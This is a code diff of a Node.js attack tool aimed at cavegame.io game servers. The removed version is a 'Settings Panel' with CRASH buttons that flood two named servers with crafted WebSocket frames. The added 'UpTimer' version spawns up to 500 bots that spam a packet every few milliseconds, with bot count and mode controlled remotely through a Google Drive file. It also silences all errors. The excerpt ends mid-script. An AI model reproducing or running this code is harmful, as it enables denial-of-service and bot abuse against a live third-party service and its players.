@@ -1,468 +1,385 @@
-const v8 = require('v8');
-v8.setFlagsFromString('--max-old-space-size=512');
+const WebSocket = require("ws");
+const { TextEncoder } = require("util");
+const http = require("http");
 
-const WebSocket = require('ws');
-const http = require('http');
-const https = require('https');
+const fetch =
+  globalThis.fetch ||
+  ((...args) =>
+    import("node-fetch").then(({ default: f }) => f(...args)));
 
-process.on('uncaughtException', () => {});
-process.on('unhandledRejection', () => {});
+const MODE_URL =
+  "https://drive.google.com/uc?export=download&id=1Igt8Zf9xJ8VonOygxPb6KMb2qVQ2TD6g";
+const WS_URL = "wss://ip-207-148-8-148.cavegame.io";
 
-const SERVERS = {
-  US: 'wss://ip-207-148-8-148.cavegame.io',
-  MR: 'wss://ip-144-202-48-35.cavegame.io'
-};
+const encoder = new TextEncoder();
 
-let SOCKETS_PER_SERVER = 1;
-let slots = {};
-let floodServers = { US: false, MR: false };
-let autoCrash = { US: false, MR: false };
-let crashReady = { US: false, MR: false };
+let CURRENT_MODE = 1;
+let TARGET_BOT_COUNT = 50;
+let SERVER_ONLINE = true;
 
-const wssAgent = new https.Agent({ rejectUnauthorized: false });
+const HEARTBEAT_INTERVAL = 5000;
 
-const PACKET_48 = Uint8Array.from([48]);
-const B1 = Buffer.from([35, 1]);
-const B0 = Buffer.from([35, 0]);
-const B36 = Buffer.from([36, 0]);
+const MAX_BUFFER = 7200;
+const KILL_BUFFER = MAX_BUFFER * 10;
 
-const CHUNK = 1000;
-function buildChunk(data) {
-  const frameLen = 6 + data.length;
-  const buf = Buffer.allocUnsafe(frameLen * CHUNK);
-  for (let i = 0; i < CHUNK; i++) {
-    const off = i * frameLen;
-    buf[off] = 0x82;
-    buf[off + 1] = 0x80 | data.length;
-    const mask = ((i * 0x9e3779b9) & 0xFFFFFFFF) >>> 0;
-    buf[off + 2] = (mask >> 24) & 0xFF;
-    buf[off + 3] = (mask >> 16) & 0xFF;
-    buf[off + 4] = (mask >> 8) & 0xFF;
-    buf[off + 5] = mask & 0xFF;
-    for (let j = 0; j < data.length; j++)
-      buf[off + 6 + j] = data[j] ^ buf[off + 2 + (j % 4)];
+const TEAM_CREATE_PACKET = Uint8Array.from([
+  49,33,47,116,101,97,109,32,99,114,101,97,116,101,32,84,101,115,116,101,114,115,32,103,51,56,57,56,101,110,97,107,108,49,48,
+]);
+
+const TEAM_JOIN_PACKET = Uint8Array.from([
+  49,31,47,116,101,97,109,32,106,111,105,110,32,84,101,115,116,101,114,115,32,103,51,56,57,56,101,110,97,107,108,49,48,
+]);
+
+const TEAM_JOINED_PACKET = Uint8Array.from([
+  24,0,0,12,84,101,97,109,32,106,111,105,110,101,100,33,4,103,111,111,100,
+]);
+
+const CHAT_JOIN_PACKET = Uint8Array.from([49,10,47,116,101,97,109,32,99,104,97,116]);
+const INFINITE_PACKET = Uint8Array.from([49,120,0]);
+
+const HEARTBEATS = [
+  Uint8Array.from([34,0,0,0,0,0,64,128,0,192,195,166,192,0]),
+  Uint8Array.from([34,0,0,0,0,0,194,143,255,252,67,177,63,255]),
+];
+
+const bots = new Set();
+
+let connectingSockets = 0;
+let totalQueuedMessages = 0;
+let lastActivity = Date.now();
+let inactivityStart = null;
+
+const INACTIVITY_THRESHOLD = 15000;
+
+function safeSend(ws, data, force = false) {
+  try {
+    if (!ws || ws.readyState !== WebSocket.OPEN) return false;
+    totalQueuedMessages += ws.bufferedAmount || 0;
+    if (ws.bufferedAmount > KILL_BUFFER) return "OVERFLOW";
+    if (!force && ws.bufferedAmount > MAX_BUFFER) return false;
+    ws.send(data);
+    return true;
+  } catch {
+    return false;
   }
-  return buf;
 }
-const FB1 = buildChunk(B1), FB0 = buildChunk(B0), FB36 = buildChunk(B36);
 
 function buildPacket(...bytes) {
-  const n = Math.floor(Math.random() * 10000);
-  return Uint8Array.from([...bytes, ...Array.from(String(n), c => c.charCodeAt(0))]);
+  const randomNum = Math.floor(Math.random() * 10000);
+  const randomBytes = Array.from(String(randomNum)).map((c) =>
+    c.charCodeAt(0)
+  );
+  return Uint8Array.from([...bytes, ...randomBytes]);
 }
 
 function buildIntroPacket() {
   return buildPacket(31, 1, 13, 240, 159, 148, 146, 13, 240, 159, 148, 145);
 }
 
-function startFloodLoop(ws) {
-  ws._gen = (ws._gen || 0) + 1;
-  const myGen = ws._gen;
-  ws._looping = true;
-  (function sendNext() {
-    if (!ws._looping || ws._gen !== myGen || ws.readyState !== WebSocket.OPEN) return;
-    const sock = ws._socket;
-    try {
-      while (ws._looping && ws._gen === myGen && ws.readyState === WebSocket.OPEN) {
-        for (let i = 0; i < 50; i++) {
-          sock.write(FB1);
-          sock.write(FB0);
-          sock.write(FB36);
-        }
-        if (sock.writableNeedDrain) {
-          sock.once('drain', sendNext);
-          return;
-        }
-      }
-    } catch {}
-    if (ws._looping && ws._gen === myGen && ws.readyState === WebSocket.OPEN) {
-      setImmediate(sendNext);
-    }
-  })();
+function isExactTeamJoined(data) {
+  const bytes = new Uint8Array(data);
+  if (bytes.length !== TEAM_JOINED_PACKET.length) return false;
+  for (let i = 0; i < bytes.length; i++) {
+    if (bytes[i] !== TEAM_JOINED_PACKET[i]) return false;
+  }
+  return true;
 }
 
-function startCrash(ws, key) {
-  try { ws.send(PACKET_48); ws.send(buildIntroPacket()); } catch {
-    // Socket is dead — remove and let ensureConnected create a fresh one
-    const arr = slots[key] || [];
-    const idx = arr.indexOf(ws);
-    if (idx !== -1) arr.splice(idx, 1);
-    try { ws.terminate(); } catch {}
+function clearBotIntervals(bot) {
+  for (const i of bot.intervals) clearInterval(i);
+  bot.intervals.length = 0;
+  bot.infInterval = null;
+}
+
+function destroyBot(bot) {
+  if (!bot || bot.destroyed) return;
+  bot.destroyed = true;
+  if (bot.connecting) {
+    bot.connecting = false;
+    connectingSockets = Math.max(0, connectingSockets - 1);
+  }
+  clearBotIntervals(bot);
+  try {
+    bot.ws?.removeAllListeners();
+    bot.ws?.terminate();
+  } catch {}
+  bots.delete(bot);
+}
+
+function attachBotHandlers(bot) {
+  const ws = bot.ws;
+
+  ws.on("open", () => {
+    if (bot.connecting) {
+      bot.connecting = false;
+      connectingSockets = Math.max(0, connectingSockets - 1);
+    }
+
+    lastActivity = Date.now();
+    SERVER_ONLINE = true;
+
+    clearBotIntervals(bot);
+
+    bot.hbIndex = bot.hbIndex || 0;
+
+    safeSend(ws, Uint8Array.from([48]));
+    safeSend(ws, buildIntroPacket());
+
+    safeSend(ws, TEAM_CREATE_PACKET, true);
+    safeSend(ws, TEAM_JOIN_PACKET, true);
+
+    bot.intervals.push(
+      setInterval(() => {
+        if (bot.destroyed) return;
+        const packet = HEARTBEATS[bot.hbIndex % 2];
+        bot.hbIndex++;
+        const res = safeSend(ws, packet, true);
+        if (res === "OVERFLOW") destroyBot(bot);
+      }, HEARTBEAT_INTERVAL)
+    );
+
+    const joinInterval = setInterval(() => {
+      if (bot.destroyed || bot.joined || ws.readyState !== WebSocket.OPEN) {
+        clearInterval(joinInterval);
+        return;
+      }
+
+      const res = safeSend(ws, TEAM_JOIN_PACKET, true);
+      if (res === "OVERFLOW") destroyBot(bot);
+
+    }, 40);
+
+    bot.intervals.push(joinInterval);
+  });
+
+  ws.on("message", (data) => {
+    lastActivity = Date.now();
+
+    if (!bot.joined && isExactTeamJoined(data)) {
+      bot.joined = true;
+      safeSend(ws, CHAT_JOIN_PACKET, true);
+
+      if (!bot.infInterval) {
+        bot.infInterval = setInterval(() => {
+          if (bot.destroyed) return;
+          if (CURRENT_MODE !== 1) return;
+
+          const res = safeSend(ws, INFINITE_PACKET, true);
+          if (res === "OVERFLOW") destroyBot(bot);
+        }, 5);
+
+        bot.intervals.push(bot.infInterval);
+      }
+    }
+  });
+
+  ws.on("close", () => destroyBot(bot));
+  ws.on("error", () => destroyBot(bot));
+}
+
+function createBot() {
+  connectingSockets++;
+  const bot = {
+    ws: new WebSocket(WS_URL),
+    joined: false,
+    destroyed: false,
+    intervals: [],
+    infInterval: null,
+    hbIndex: 0,
+    connecting: true,
+  };
+  attachBotHandlers(bot);
+  bots.add(bot);
+}
+
+function ensureBotCount() {
+  if (!SERVER_ONLINE) return;
+
+  let total = bots.size;
+
+  while (total < TARGET_BOT_COUNT) {
+    createBot();
+    total++;
+  }
+
+  if (total > TARGET_BOT_COUNT) {
+    let excess = total - TARGET_BOT_COUNT;
+
+    for (const bot of [...bots]) {
+      if (excess <= 0) break;
+      destroyBot(bot);
+      excess--;
+    }
+  }
+}
+
+function applyConfig(newMode, newAmount) {
+  if (newMode === CURRENT_MODE && newAmount === TARGET_BOT_COUNT) return;
+  CURRENT_MODE = newMode;
+  TARGET_BOT_COUNT = newAmount;
+  ensureBotCount();
+}
+
+function parseConfig(text) {
+  const lines = text.replace(/\r/g, "").split("\n").map(l => l.trim().toLowerCase());
+  let mode = CURRENT_MODE;
+  let amount = TARGET_BOT_COUNT;
+
+  for (const line of lines) {
+    if (line.startsWith("mode:")) {
+      const val = parseInt(line.split(":")[1]?.trim());
+      if (val === 1 || val === 2) mode = val;
+    }
+    if (line.startsWith("amount:")) {
+      const val = parseInt(line.split(":")[1]?.trim());
+      if (!isNaN(val) && val > 0) amount = val;
+    }
+  }
+
+  return { mode, amount: Math.min(amount, 500) };
+}
+
+async function fetchInitialConfig() {
+  try {
+    const res = await fetch(MODE_URL + "&t=" + Date.now());
+    const txt = await res.text();
+    const { mode, amount } = parseConfig(txt);
+    CURRENT_MODE = mode;
+    TARGET_BOT_COUNT = amount;
+  } catch {}
+}
+
+async function pollConfigFile() {
+  try {
+    const res = await fetch(MODE_URL + "&t=" + Date.now());
+    const txt = await res.text();
+    const { mode, amount } = parseConfig(txt);
+    applyConfig(mode, amount);
+  } catch {}
+}
+
+async function init() {
+  await fetchInitialConfig();
+  ensureBotCount();
+  setInterval(pollConfigFile, 1000);
+  setInterval(ensureBotCount, 20);
+}
+
+init();
+
+process.on("uncaughtException", () => {});
+process.on("unhandledRejection", () => {});
+
+setInterval(() => {
+  const now = Date.now();
+  const inactive = now - lastActivity > INACTIVITY_THRESHOLD;
+  if (inactive) {
+    if (!inactivityStart) inactivityStart = now;
+  } else {
+    inactivityStart = null;
+  }
+}, 1000);
+
+const PORT = process.env.PORT || 3000;
+
+http.createServer((req, res) => {
+  if (req.url === "/stats") {
+    res.writeHead(200, { "Content-Type": "application/json" });
+    res.end(JSON.stringify({
+      connected: bots.size - connectingSockets,
+      connecting: connectingSockets,
+      total: bots.size,
+      queuedMessages: totalQueuedMessages,
+      uptime: process.uptime(),
+      inactiveFor: inactivityStart ? Date.now() - inactivityStart : 0
+    }));
     return;
   }
-  if (crashReady[key]) { startFloodLoop(ws); return; }
-  ws._awaiting10 = true;
-  ws._onCrashMsg = (data) => {
-    if (ws._awaiting10 && (Buffer.isBuffer(data) ? data[0] : data.charCodeAt(0)) === 10) {
-      ws._awaiting10 = false;
-      ws.removeListener('message', ws._onCrashMsg);
-      crashReady[key] = true;
-      if (floodServers[key]) startFloodLoop(ws);
-    }
-  };
-  ws.on('message', ws._onCrashMsg);
-  ws._crashTimer = setTimeout(() => {
-    if (ws._awaiting10) {
-      ws._awaiting10 = false;
-      ws.removeListener('message', ws._onCrashMsg);
-      crashReady[key] = true;
-      if (floodServers[key]) startFloodLoop(ws);
-    }
-  }, 1000);
-}
 
-function createSocket(key) {
-  let ws;
-  try {
-    ws = new WebSocket(SERVERS[key], { agent: wssAgent });
-  } catch {
-    return null;
-  }
-  ws._key = key;
-  ws.on('open', () => {
-    if (floodServers[key]) startCrash(ws, key);
-  });
-  function tryConnect() {
-    setImmediate(() => {
-      const a = slots[key] || [];
-      if (a.length >= SOCKETS_PER_SERVER) return;
-      const w = createSocket(key);
-      if (w) { a.push(w); slots[key] = a; }
-      else tryConnect();
-    });
-  }
-  function handleDisconnect() {
-    const arr = slots[key] || [];
-    const idx = arr.indexOf(ws);
-    if (idx !== -1) arr.splice(idx, 1);
-    if (arr.length === 0 && floodServers[key]) {
-      if (!autoCrash[key]) { floodServers[key] = false; crashReady[key] = false; }
-      ensureConnected(key);
-      return;
-    }
-    tryConnect();
-  }
-  ws.on('close', handleDisconnect);
-  ws.on('error', () => {
-    try { ws.terminate(); } catch {}
-    handleDisconnect();
-  });
-  return ws;
-}
-
-function ensureConnected(key) {
-  const arr = slots[key] || [];
-  if (arr.length < SOCKETS_PER_SERVER) {
-    for (let i = arr.length; i < SOCKETS_PER_SERVER; i++) {
-      const ws = createSocket(key);
-      if (ws) arr.push(ws);
-    }
-    slots[key] = arr;
-    if (arr.length < SOCKETS_PER_SERVER) {
-      setImmediate(() => ensureConnected(key));
-    }
-  } else if (arr.length > SOCKETS_PER_SERVER) {
-    const excess = arr.splice(SOCKETS_PER_SERVER);
-    for (const ws of excess) {
-      ws._looping = false;
-      try { ws.terminate(); } catch {}
-    }
-  }
-}
-
-function applyChanges(onlyKey) {
-  const keys = onlyKey ? [onlyKey] : Object.keys(SERVERS);
-  for (const key of keys) {
-    for (const ws of (slots[key] || [])) {
-      ws._looping = false;
-      ws._awaiting10 = false;
-      clearTimeout(ws._crashTimer);
-      if (ws._onCrashMsg) ws.removeListener('message', ws._onCrashMsg);
-    }
-    if (!floodServers[key]) crashReady[key] = false;
-    for (const ws of [...(slots[key] || [])]) {
-      if (ws.readyState === WebSocket.OPEN && floodServers[key]) startCrash(ws, key);
-    }
-    ensureConnected(key);
-  }
-}
-
-function parsePath(url) {
-  const q = url.indexOf('?');
-  return q === -1 ? url : url.slice(0, q);
-}
-
-function qsVal(url, name) {
-  const q = url.indexOf('?');
-  if (q === -1) return null;
-  return new URLSearchParams(url.slice(q)).get(name);
-}
-
-const server = http.createServer((req, res) => {
-  const path = parsePath(req.url);
-
-  try {
-    if (path === '/api/status') {
-      const count = key => (slots[key] || []).filter(w => w.readyState === WebSocket.OPEN).length;
-      const state = key => {
-        const arr = slots[key] || [];
-        if (arr.some(w => w.readyState === WebSocket.OPEN)) return 'connected';
-        if (arr.some(w => w.readyState === WebSocket.CONNECTING)) return 'connecting';
-        return 'error';
-      };
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({
-        usCount: count('US'), mrCount: count('MR'),
-        usTarget: SOCKETS_PER_SERVER, mrTarget: SOCKETS_PER_SERVER,
-        totalConnected: count('US') + count('MR'),
-        floodUS: floodServers.US, floodMR: floodServers.MR,
-        autoUS: autoCrash.US, autoMR: autoCrash.MR,
-        socketsPerServer: SOCKETS_PER_SERVER,
-        usState: state('US'), mrState: state('MR')
-      }));
-    }
-
-    if (path === '/api/toggle') {
-      const key = qsVal(req.url, 'server');
-      if (!SERVERS[key]) { res.writeHead(400); return res.end('bad server'); }
-      if (!floodServers[key] && !autoCrash[key]) {
-        floodServers[key] = true;
-        applyChanges(key);
-      }
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ ok: true }));
-    }
-
-    if (path === '/api/auto') {
-      const key = qsVal(req.url, 'server');
-      const state = qsVal(req.url, 'state') === 'true';
-      if (!SERVERS[key]) { res.writeHead(400); return res.end('bad server'); }
-      autoCrash[key] = state;
-      if (state) {
-        if (!floodServers[key]) {
-          floodServers[key] = true;
-          applyChanges(key);
-        }
-      } else {
-        if (floodServers[key]) {
-          floodServers[key] = false;
-          applyChanges(key);
-        }
-      }
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ ok: true }));
-    }
-
-    if (path === '/api/reset') {
-      const key = qsVal(req.url, 'server');
-      if (!SERVERS[key]) { res.writeHead(400); return res.end('bad server'); }
-      for (const ws of (slots[key] || [])) {
-        ws._looping = false;
-        try { ws.terminate(); } catch {}
-      }
-      slots[key] = [];
-      crashReady[key] = false;
-      if (!autoCrash[key]) floodServers[key] = false;
-      ensureConnected(key);
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ ok: true }));
-    }
-
-    if (path === '/api/config') {
-      const count = parseInt(qsVal(req.url, 'count'));
-      if (count > 0 && count <= 100) {
-        SOCKETS_PER_SERVER = count;
-        applyChanges();
-        res.writeHead(200, { 'Content-Type': 'application/json' });
-        return res.end(JSON.stringify({ ok: true, socketsPerServer: SOCKETS_PER_SERVER }));
-      }
-      res.writeHead(400);
-      return res.end('bad count');
-    }
-
-    if (path === '/api/sync') {
-      const aUS = qsVal(req.url, 'autoUS') === 'true';
-      const aMR = qsVal(req.url, 'autoMR') === 'true';
-      const cnt = parseInt(qsVal(req.url, 'count'));
-      if (cnt > 0 && cnt <= 100) SOCKETS_PER_SERVER = cnt;
-      autoCrash.US = aUS;
-      autoCrash.MR = aMR;
-      if (aUS && !floodServers.US) { floodServers.US = true; applyChanges('US'); }
-      if (aMR && !floodServers.MR) { floodServers.MR = true; applyChanges('MR'); }
-      res.writeHead(200, { 'Content-Type': 'application/json' });
-      return res.end(JSON.stringify({ ok: true }));
-    }
-  } catch { res.writeHead(500); return res.end('err'); }
-
-  res.writeHead(200, { 'Content-Type': 'text/html' });
+  res.writeHead(200, { "Content-Type": "text/html" });
   res.end(`<!DOCTYPE html>
 <html>
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Settings Panel</title>
+<title>UpTimer</title>
+<link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAjVBMVEWwWECwWUCxWUCyWUCyWUGyWkCyWkGzWUGzWkCzWkG0WkG0W0G1W0G1W0K2W0K2XEK3XEK3XEO4XEO4XUO5XEO5XUO6XUO6XUS6XkS7XkS8XkS8X0S8X0W9X0S9X0W+X0W/X0W/YEXAYEXAYEbBYEbBYUXBYUbCYUbDYUbDYUfDYkbDYkfEYUfEYkfFYkeohyysAAADQ0lEQVRYw51X22KbMAx1nGVr2rWjWUjBHjhgiunF/P/nDWwLfCMk8RvGOsjS0ZFA+VWrlLCY9wZdB1BNADQOUMvyIkA9AZAIQNn2Uopp67ALAVqw77MIgFCvCrNzxHjrn8qbzgB85TEP1KtWb7zhcb0FPmQ5LSve1jGAXMH3egPrdcyvXAqADfaVft4aAHy4BSAXkN0d2ONN4h8lFwBg7bG1gkSw0Jxx5OT/YNmnIZUaxyHWdEP6kRvW42TvRZHqJM7XOPc6r0i4B08mAn4Mv9Rp6zAxxEDSO3lSeUjixWDzYgIIimAbsR++KLxKbAEg4Fa+e44mjDexAkXyI79vFQaA5veuwfq7rdYEhZJljWAeE0kdEZVP2UtRrdbCFBVRFW4Rq3s6AMf9EgCojgMSCOmgFw9xgGySPck9BhceU3dRgGIGmGNR9q6QZlovdjGAWbltxpKC8XZ+THWp/IkBiMleXAi6kszf0SvMDtQXmbHFT9Egzs1LFpe59RhPI4+GYEkJIwBFBUGwYkarrreK5bQmqiUfVQ54V9adS8Nk0qmKLnbnQSqN08w41MGblyH+J6BXV623d2inELsxgds5Xv0qANTGWVNooyj0MEEbtqD3RdowN6jJ1K8YVNhIUzTPHKkvpb2b1kfomIUwu2OloLlYPYoBucUZnn/+gLmBcOUXVaIKeRo/sD15utsyZ0TwCaYB6vmKGDmH2AoLRwlBH632ACmAl9uEeVBM5LS0/Y3KTklm8eAJ4+z27mATKXm94pvVZ3nPpKpjVqjyau4GAL3IlgCykkQSPq8uEG0HgHJoCLUUbpfjxBmYeVyR+sk7ReG+40zZkRZMqAH4zqIedDDMzy2qH/xorHrqIiM/cif62hqftGYwq70a4W3+5fnfQ/rmx0D2oiKWDhg1s0p6lH5eZjASb/ZuFs6BwKuMn61eU1NzfYKhQ0V4ILz/IynCqiQbaJFomS/h/5HXIvFrFMBq88u1pSU2jQKw76u6dHpIXiALafK8t2dzUnIRMG65nLU3h7Bum+JKPdjcoWUOgBp7HlfO1S1nJY3UKTJNb7cC8AXkrEOAZ7zBv1Y8yKBLyfcQIEtXxxCLXfy+v3c6Afhz8391Qq4gKHLTTQAAAABJRU5ErkJggg==">
 <style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{overflow:hidden;height:100vh;background:radial-gradient(circle at top left,#1e3a8a,#0f172a);font-family:Inter,Arial,sans-serif;display:flex;align-items:center;justify-content:center}
-.panel{width:420px;border-radius:32px;background:white;overflow:hidden;position:absolute;box-shadow:0 25px 60px rgba(0,0,0,.35);user-select:none;backdrop-filter:blur(20px)}
-.header{height:110px;background:linear-gradient(135deg,#2563eb,#7dd3fc);position:relative;display:flex;align-items:center;justify-content:center}
-.header h1{color:white;font-size:30px;font-weight:800;letter-spacing:.5px;z-index:2}
-.content{padding:30px}
-.server{background:#f8fafc;border-radius:22px;padding:20px;margin-bottom:18px;display:flex;align-items:center;justify-content:space-between;transition:.2s;border:1px solid #e2e8f0}
-.server:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,0,0,.08)}
-.left{display:flex;flex-direction:column;gap:8px}
-.name{font-size:22px;font-weight:800;color:#0f172a}
-.status{display:flex;align-items:center;gap:8px;color:#475569;font-size:14px;font-weight:600}
-.dot{width:11px;height:11px;border-radius:50%}
-.connected{background:#22c55e;box-shadow:0 0 12px #22c55e}
-.connecting{background:#f59e0b;box-shadow:0 0 12px #f59e0b}
-.disconnected{background:#ef4444;box-shadow:0 0 12px #ef4444}
-.sockets{color:#64748b;font-size:14px;font-weight:700}
-.controls{display:flex;align-items:center;gap:10px}
-.crash-btn{padding:8px 16px;border:none;border-radius:10px;font-size:13px;font-weight:800;cursor:pointer;transition:.2s;letter-spacing:.5px;white-space:nowrap}
-.crash-btn.green{background:linear-gradient(135deg,#22c55e,#4ade80);color:white;box-shadow:0 4px 12px rgba(34,197,94,.4)}
-.crash-btn.green:hover{transform:scale(1.05);box-shadow:0 6px 20px rgba(34,197,94,.5)}
-.crash-btn.yellow{background:linear-gradient(135deg,#eab308,#facc15);color:#422006;box-shadow:0 4px 12px rgba(234,179,8,.4);cursor:default}
-.crash-btn.gray{background:linear-gradient(135deg,#94a3b8,#cbd5e1);color:#475569;box-shadow:0 4px 12px rgba(148,163,184,.4);cursor:default}
-.reset-btn{padding:6px 12px;border:none;border-radius:8px;font-size:11px;font-weight:800;cursor:pointer;transition:.2s;letter-spacing:.5px;background:linear-gradient(135deg,#7c3aed,#a78bfa);color:white;box-shadow:0 4px 12px rgba(124,58,237,.4);white-space:nowrap}
-.reset-btn:hover{transform:scale(1.05);box-shadow:0 6px 20px rgba(124,58,237,.5)}
-.switch{position:relative;width:44px;height:24px;flex-shrink:0}
-.switch input{display:none}
-.slider{position:absolute;inset:0;border-radius:999px;background:#cbd5e1;transition:.25s;cursor:pointer}
-.slider::before{content:'';position:absolute;width:18px;height:18px;border-radius:50%;background:white;top:3px;left:3px;transition:.25s;box-shadow:0 2px 6px rgba(0,0,0,.2)}
-input:checked+.slider.yellow{background:linear-gradient(135deg,#eab308,#facc15);box-shadow:0 0 12px rgba(234,179,8,.5)}
-input:checked+.slider.yellow::before{transform:translateX(20px)}
-.config-row{display:flex;align-items:center;justify-content:space-between;padding:14px 20px;background:#f8fafc;border-radius:22px;border:1px solid #e2e8f0;margin-top:18px}
-.config-row label{font-size:14px;font-weight:700;color:#0f172a}
-.config-row input{width:70px;padding:8px 10px;border:1px solid #e2e8f0;border-radius:10px;font-size:14px;font-weight:600;text-align:center;outline:none;background:white;color:#0f172a}
-.config-row input:focus{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,.15)}
+body{margin:0;background:#111;font-family:Segoe UI,Tahoma,sans-serif}
+#panel{position:fixed;top:20px;left:20px;width:240px;background:#222;border-radius:12px;color:#fff;overflow:hidden}
+#header{background:#0072ff;padding:8px;font-weight:bold;text-align:center;cursor:move;user-select:none}
+#content{padding:10px}
+.stat{margin-bottom:6px;padding:6px;background:rgba(255,255,255,0.05);border-radius:6px;font-size:13px}
 </style>
 </head>
 <body>
-<div class="panel" id="panel" style="display:none">
-  <div class="header"><h1>Settings Panel</h1></div>
-  <div class="content">
-    <div class="server">
-      <div class="left">
-        <div class="name">US</div>
-        <div class="status"><div class="dot disconnected" id="usDot"></div><span id="usText">Disconnected</span></div>
-        <div class="sockets"><span id="usSockets">0</span>/<span id="usTarget">0</span> sockets</div>
-      </div>
-      <div class="controls">
-        <button class="crash-btn green" id="btnUS">CRASH</button>
-        <label class="switch"><input type="checkbox" id="autoUS"><span class="slider yellow"></span></label>
-        <button class="reset-btn" id="resetUS">RESET</button>
-      </div>
-    </div>
-    <div class="server">
-      <div class="left">
-        <div class="name">MR</div>
-        <div class="status"><div class="dot disconnected" id="mrDot"></div><span id="mrText">Disconnected</span></div>
-        <div class="sockets"><span id="mrSockets">0</span>/<span id="mrTarget">0</span> sockets</div>
-      </div>
-      <div class="controls">
-        <button class="crash-btn green" id="btnMR">CRASH</button>
-        <label class="switch"><input type="checkbox" id="autoMR"><span class="slider yellow"></span></label>
-        <button class="reset-btn" id="resetMR">RESET</button>
-      </div>
-    </div>
-    <div class="config-row">
-      <label>Sockets per server</label>
-      <input type="number" id="socketCount" min="1" max="100" value="1" />
-    </div>
-  </div>
+<div id="panel">
+<div id="header">
+  <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAMAAACdt4HsAAAAjVBMVEWwWECwWUCxWUCyWUCyWUGyWkCyWkGzWUGzWkCzWkG0WkG0W0G1W0G1W0K2W0K2XEK3XEK3XEO4XEO4XUO5XEO5XUO6XUO6XUS6XkS7XkS8XkS8X0S8X0W9X0S9X0W+X0W/X0W/YEXAYEXAYEbBYEbBYUXBYUbCYUbDYUbDYUfDYkbDYkfEYUfEYkfFYkeohyysAAADQ0lEQVRYw51X22KbMAx1nGVr2rWjWUjBHjhgiunF/P/nDWwLfCMk8RvGOsjS0ZFA+VWrlLCY9wZdB1BNADQOUMvyIkA9AZAIQNn2Uopp67ALAVqw77MIgFCvCrNzxHjrn8qbzgB85TEP1KtWb7zhcb0FPmQ5LSve1jGAXMH3egPrdcyvXAqADfaVft4aAHy4BSAXkN0d2ONN4h8lFwBg7bG1gkSw0Jxx5OT/YNmnIZUaxyHWdEP6kRvW42TvRZHqJM7XOPc6r0i4B08mAn4Mv9Rp6zAxxEDSO3lSeUjixWDzYgIIimAbsR++KLxKbAEg4Fa+e44mjDexAkXyI79vFQaA5veuwfq7rdYEhZJljWAeE0kdEZVP2UtRrdbCFBVRFW4Rq3s6AMf9EgCojgMSCOmgFw9xgGySPck9BhceU3dRgGIGmGNR9q6QZlovdjGAWbltxpKC8XZ+THWp/IkBiMleXAi6kszf0SvMDtQXmbHFT9Egzs1LFpe59RhPI4+GYEkJIwBFBUGwYkarrreK5bQmqiUfVQ54V9adS8Nk0qmKLnbnQSqN08w41MGblyH+J6BXV623d2inELsxgds5Xv0qANTGWVNooyj0MEEbtqD3RdowN6jJ1K8YVNhIUzTPHKkvpb2b1kfomIUwu2OloLlYPYoBucUZnn/+gLmBcOUXVaIKeRo/sD15utsyZ0TwCaYB6vmKGDmH2AoLRwlBH632ACmAl9uEeVBM5LS0/Y3KTklm8eAJ4+z27mATKXm94pvVZ3nPpKpjVqjyau4GAL3IlgCykkQSPq8uEG0HgHJoCLUUbpfjxBmYeVyR+sk7ReG+40zZkRZMqAH4zqIedDDMzy2qH/xorHrqIiM/cif62hqftGYwq70a4W3+5fnfQ/rmx0D2oiKWDhg1s0p6lH5eZjASb/ZuFs6BwKuMn61eU1NzfYKhQ0V4ILz/IynCqiQbaJFomS/h/5HXIvFrFMBq88u1pSU2jQKw76u6dHpIXiALafK8t2dzUnIRMG65nLU3h7Bum+JKPdjcoWUOgBp7HlfO1S1nJY3UKTJNb7cC8AXkrEOAZ7zBv1Y8yKBLyfcQIEtXxxCLXfy+v3c6Afhz8391Qq4gKHLTTQAAAABJRU5ErkJggg==" 
+  style="height:18px;vertical-align:middle;margin-left:3px;">
+  Script Status
 </div>
+<div id="content">
+<div class="stat" id="uptime"></div>
+<div class="stat" id="connected"></div>
+<div class="stat" id="connecting"></div>
+<div class="stat" id="queued"></div>
+<div class="stat" id="inactive"></div>
+</div>
+</div>
+
 <script>
-const panel=document.getElementById('panel');
-let dragging=0,offX=0,offY=0;
-panel.onmousedown=e=>{dragging=1;offX=e.clientX-panel.offsetLeft;offY=e.clientY-panel.offsetTop};
-document.onmousemove=e=>{if(!dragging)return;panel.style.left=(e.clientX-offX)+'px';panel.style.top=(e.clientY-offY)+'px'};
-document.onmouseup=()=>dragging=0;
+const panel = document.getElementById("panel");
+const header = document.getElementById("header");
 
-const btnUS=document.getElementById('btnUS'),btnMR=document.getElementById('btnMR');
-const resetUS=document.getElementById('resetUS'),resetMR=document.getElementById('resetMR');
-const autoUS=document.getElementById('autoUS'),autoMR=document.getElementById('autoMR');
-const usDot=document.getElementById('usDot'),mrDot=document.getElementById('mrDot');
-const usText=document.getElementById('usText'),mrText=document.getElementById('mrText');
-const usSock=document.getElementById('usSockets'),mrSock=document.getElementById('mrSockets');
-const usTgt=document.getElementById('usTarget'),mrTgt=document.getElementById('mrTarget');
-const sockCount=document.getElementById('socketCount');
+let dragging = false;
+let offsetX = 0;
+let offsetY = 0;
 
-autoUS.checked=localStorage.getItem('autoUS')==='true';
-autoMR.checked=localStorage.getItem('autoMR')==='true';
-sockCount.value=localStorage.getItem('socketCount')||'1';
+const savedX = localStorage.getItem("panelX");
+const savedY = localStorage.getItem("panelY");
 
-btnUS.onclick=()=>{
-  if(btnUS.classList.contains('green'))
-    fetch('/api/toggle?server=US');
-};
-btnMR.onclick=()=>{
-  if(btnMR.classList.contains('green'))
-    fetch('/api/toggle?server=MR');
-};
-resetUS.onclick=()=>fetch('/api/reset?server=US');
-resetMR.onclick=()=>fetch('/api/reset?server=MR');
-autoUS.onchange=()=>{
-  localStorage.setItem('autoUS',autoUS.checked);
